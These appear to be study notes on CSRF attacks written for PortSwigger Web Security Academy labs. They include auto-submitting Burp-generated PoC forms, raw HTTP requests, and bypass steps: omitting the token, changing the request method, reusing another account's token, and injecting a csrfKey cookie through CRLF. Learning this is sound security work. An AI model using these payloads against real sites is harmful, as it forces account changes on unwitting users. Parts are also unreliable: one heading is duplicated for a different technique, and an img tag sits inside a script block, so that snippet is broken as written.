# Cross-Site Request Forgery

## Burp Suite CSRF PoF 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8c00430370cdb281bc2110000d005a.web-security-academy.net/my-account" method="POST">
      <input type="hidden" name="id" value="wiener" />
      <input type="hidden" name="csrf" value="ASLKCEVLASKSfaksW" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Check if there's any csrf defense mechanism
We can check this by omitting the **`<input type="hidden" name="csrf" value="ASLKCEVLASKSfaksW" />`** part from the above payload. 

### CSRF where token validation depends on request method
Most requests are POST request, which validate the csrf token. However, when chaning these requests to other methods, the token is no longer valid. We can test this by changing the request method.

### CSRF where token validation depends on token bieng present
The token is only validated when it is present. When it is not ( by omitting the value field or the whole thinig like no defense mechanism scenario), there is no CSRF tokekn validation.

### CSRF token is not tied to the user session
Check if we can use CSRF token of 1 account to exploit another account. 
1. Log in account A and acquire its token
2. Log in account B and deliver the payload, modify the token with account A's token

### CSRF token is tied to a non-session cookie
Some applications use different frameworks for csrf tokens, which results in two different tokens being present at the same titme.

```bash
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

1. Log in as an attacker and acquire the csrfKey
2. Log in the victim and set the victim's csrfKey value to the attackers
3. Deliver the payload

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac5009504bab9d186967b5f002b0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hello&#64;world&#46;com" />
      <input type="hidden" name="csrf" value="7UvMSxuvnPngKzO9D1OqyuylaKBAJkpK" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </script>
  </body>
</html>
```
**NOTE:** In this case, we assume the search function allows us to set cookies. We can do it directly in the developer tool.

### CSRF token is tied to a non-session cookie
Some applications have both csrf token in the session cookies and the request

```bash
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

1. Here we can make up any value for the csrf, either through the Developer Tools or through some functionalities that allow us to set cookie.
2. Deliver the payload (which has csrf set to the value we make up in step 1)

